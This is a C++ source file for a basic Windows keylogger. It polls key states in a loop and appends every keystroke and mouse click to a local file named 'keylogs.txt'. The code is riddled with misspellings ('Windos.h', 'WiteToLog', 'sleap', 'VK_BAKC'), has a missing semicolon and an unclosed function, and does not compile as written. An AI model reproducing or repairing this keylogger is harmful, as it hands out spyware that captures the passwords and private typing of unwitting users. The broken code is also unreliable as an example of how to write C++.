#include <Windos.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std ;

void WriteToLog(LPCSTR text)
{
	ofstream logfile; // Create opject fo file stream
	logfile.open("keylogs.txt", fstream::app);  // Create file for writing
	logfile << text; // Write to logfile
	logfile.close();

}
bool KeyIsListed(int ikey)
{
	switch(ikey)
	{
	case VK_SPACE:
		cout << " ";
		WriteToLog(" ");									              break;
	case VK_RETURN:
		cout << "\n" ;
		WriteToLog("\n");
		break;
	case VK_SHIFT:
		cout <<" *Shift* ";
	        WriteToLog(" *Shift* ");
		break;
	case VK_BAKC:
		cout << "\b";
		WriteToLog("\b");
		break ;
	case VK_RBUTTON:
		cout << " *Rclick* ";
		WiteToLog(" *Rclick* ");
		break;
	case VK_LBUTTON:
                cout << " *Lclick* ";		                
		WiteToLog(" *Lclick* ")
		break;


	default: return false;

	}

int main ()
{
	char key;
	while (true)
	{
		sleap(10);
		for (key=8; key<=190; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				if (KeyIsListed(key) == false)
				{
					cout << key ;
					ofstream logfile; // Create opject fo file stream
				        logfile.open("keylogs.txt", fstream::app);  // Create file for writing
				        logfile << key; // Write to logfile
					logfile.close();
				}
			}
		}

	
	}




}

